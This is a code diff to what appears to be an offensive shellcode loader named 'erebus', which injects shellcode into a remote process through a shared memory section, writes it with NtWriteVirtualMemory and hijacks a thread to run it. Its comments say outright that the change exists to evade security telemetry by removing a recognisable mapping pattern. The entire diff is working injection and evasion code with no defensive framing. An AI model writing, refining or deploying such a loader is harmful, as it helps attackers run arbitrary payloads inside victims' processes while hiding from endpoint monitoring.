@@ -14,9 +14,14 @@ namespace erebus {
 		ImportFunction(ntdll, NtCreateSection, typeNtCreateSection);
 		ImportFunction(ntdll, NtMapViewOfSection, typeNtMapViewOfSection);
 		ImportFunction(ntdll, NtUnmapViewOfSection, typeNtUnmapViewOfSection);
+		ImportFunction(ntdll, NtWriteVirtualMemory, typeNtWriteVirtualMemory);
 		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
 		ImportFunction(ntdll, NtClose, typeNtClose);
 
+		// Pagefile-backed nameless section. Max protection stays RWX because
+		// NtMapViewOfSection cannot raise a view above the section max, and we
+		// need both a writable path (via NtWriteVirtualMemory) and an
+		// executable remote view.
 		NTSTATUS status = NtCreateSection(
 			&section_handle,
 			SECTION_ALL_ACCESS,
@@ -34,36 +39,13 @@ namespace erebus {
 
 		LOG_SUCCESS("Section created");
 
-		// Map to local process for writing
-		PVOID local_address = NULL;
-		SIZE_T local_view_size = shellcode_size;
-
-		status = NtMapViewOfSection(
-			section_handle,
-			NtCurrentProcess(),
-			&local_address,
-			NULL,
-			NULL,
-			NULL,
-			&local_view_size,
-			(SECTION_INHERIT)ViewShare,
-			NULL,
-			PAGE_READWRITE
-		);
-
-		if (!NT_SUCCESS(status)) {
-			LOG_ERROR("Failed to map view to local process (NTSTATUS: 0x%08X)", status);
-			NtClose(section_handle);
-			return;
-		}
-
-		LOG_SUCCESS("Mapped to local process at: 0x%08pX", local_address);
-
-		// Copy shellcode to mapped section
-		RtlCopyMemory(local_address, shellcode, shellcode_size);
-		LOG_SUCCESS("Shellcode copied to section");
-
-		// Map to remote process for execution
+		// Map to remote process directly as PAGE_EXECUTE_READ. No local view
+		// is ever created - previous revisions mapped the section RW in the
+		// current process, memcpy'd, then mapped it RX remotely, which leaves
+		// a recognisable "double-map w/ protection downgrade" pattern in
+		// NtMapViewOfSection telemetry. We now write to the remote view via
+		// NtWriteVirtualMemory, which the kernel services by temporarily
+		// unprotecting at the PTE level (allowed because section max is RWX).
 		PVOID remote_address = NULL;
 		SIZE_T remote_view_size = shellcode_size;
 
@@ -82,7 +64,24 @@ namespace erebus {
 
 		if (!NT_SUCCESS(status)) {
 			LOG_ERROR("Failed to map view to remote process (NTSTATUS: 0x%08X)", status);
-			NtUnmapViewOfSection(NtCurrentProcess(), local_address);
+			NtClose(section_handle);
+			return;
+		}
+
+		// Write shellcode into the remote RX view. NtWriteVirtualMemory
+		// bypasses the view protection for section-backed pages because the
+		// section max allows writes.
+		SIZE_T bytes_written = 0;
+		status = NtWriteVirtualMemory(
+			process_handle,
+			remote_address,
+			shellcode,
+			shellcode_size,
+			&bytes_written
+		);
+		if (!NT_SUCCESS(status) || bytes_written != shellcode_size) {
+			LOG_ERROR("NtWriteVirtualMemory failed (NTSTATUS: 0x%08X)", status);
+			NtUnmapViewOfSection(process_handle, remote_address);
 			NtClose(section_handle);
 			return;
 		}
@@ -95,7 +94,7 @@ namespace erebus {
 		
 		if (!GetThreadContext(thread_handle, context_ptr)) {
 			LOG_ERROR("Failed to get thread context (Code: 0x%08lX)", GetLastError());
-			NtUnmapViewOfSection(NtCurrentProcess(), local_address);
+			delete context_ptr;
 			NtUnmapViewOfSection(process_handle, remote_address);
 			NtClose(section_handle);
 			return;
@@ -111,7 +110,6 @@ namespace erebus {
 		if (!SetThreadContext(thread_handle, context_ptr)) {
 			LOG_ERROR("Failed to set thread context (Code: 0x%08lX)", GetLastError());
 			delete context_ptr;
-			NtUnmapViewOfSection(NtCurrentProcess(), local_address);
 			NtUnmapViewOfSection(process_handle, remote_address);
 			NtClose(section_handle);
 			return;
@@ -130,8 +128,9 @@ namespace erebus {
 			LOG_SUCCESS("Thread resumed, shellcode executing");
 		}
 
-		// Cleanup local mapping
-		NtUnmapViewOfSection(NtCurrentProcess(), local_address);
+		// Cleanup: no local mapping to tear down, just close the section.
+		// The remote view stays mapped in the target until its process exits
+		// or the shellcode unmaps itself.
 		NtClose(section_handle);
 		NtClose(process_handle);
 		NtClose(thread_handle);
